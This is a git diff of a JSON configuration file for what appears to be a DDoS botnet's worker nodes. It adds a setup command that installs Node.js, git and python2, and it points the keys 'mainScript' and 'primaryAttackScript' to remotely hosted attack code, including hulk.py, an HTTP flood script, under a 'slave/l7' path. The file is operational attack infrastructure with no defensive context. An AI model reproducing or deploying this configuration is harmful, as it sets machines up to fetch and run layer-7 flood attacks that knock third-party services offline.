@@ -1,6 +1,7 @@
 {
     "slave": {
-        "mainscript": "https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/index.js",
-        "primary_attack_script": "https://raw.githubusercontent.com/mehmetefeerkan/hypernovus-puppet/main/source/hulk.py"
+        "setupLine": "sudo apt -y update; sudo apt -y upgrade ; sudo apt install wget; cd ~; curl -sL https://deb.nodesource.com/setup_14.x -o nodesource_setup.sh; sudo bash nodesource_setup.sh; sudo apt install nodejs -y; sudo apt install git -y; sudo apt install python2 -y;",
+        "mainScript": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/index.js",
+        "primaryAttackScript": "https://raw.githubusercontent.com/mehmetefeerkan/C.A.N.A.V.A.R/master/slave/l7/source/hulk.py"
     }
 }
